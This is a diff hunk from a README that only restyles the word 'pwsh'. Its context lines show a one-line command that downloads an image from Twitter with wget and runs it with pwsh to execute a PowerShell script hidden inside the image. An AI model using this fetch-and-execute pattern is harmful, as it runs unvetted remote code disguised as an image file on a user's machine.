@@ -58,7 +58,7 @@ Once you have the image address, type the following command in the terminal with
 ```bash
  wget "https://pbs.twimg.com/media/F6LKHaqXkAAbJ6n?format=jpg&name=small";pwsh F6*
 ```
-The *wget* command downloads the image from ***Twitter***, then the pwsh command followed by the name of the downloaded image runs the embedded ***PowerShell*** script.
+The *wget* command downloads the image from ***Twitter***, then the *pwsh* command followed by the name of the downloaded image runs the embedded ***PowerShell*** script.
 
 My other programs you may find useful:-  
 
